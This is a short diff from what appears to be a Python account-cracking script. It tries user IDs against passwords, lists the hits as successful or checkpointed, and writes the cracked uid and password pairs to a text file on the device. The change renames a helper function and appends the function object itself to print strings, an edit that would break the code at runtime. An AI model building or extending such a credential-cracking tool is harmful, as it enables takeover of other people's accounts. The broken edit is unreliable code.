@@ -673,7 +673,7 @@ else:
     pass
 
 # YEAR ACCOUNT
-def accYr(yx):
+def yxxr(yx):
     if len(yx) == 15:
         if yx[:10] in ["1000000000"]:
             yir = "2009"
@@ -1108,12 +1108,12 @@ def gxds_files(uid, pxss):
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print(f"\r\r{lr}  [GXDS-CP] {uid}:{ps}")
+                print(f"\r\r{lr}  [GXDS-CP] {uid}:{ps}"+yxxr)
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
             else:
-                print(f"\r\r{lr}  [GXDS-X] {uid}:{ps}")
+                print(f"\r\r{lr}  [GXDS-X] {uid}:{ps}"+yxxr)
                 continue
         loop += 1
     except requests.exceptions.ConnectionError:
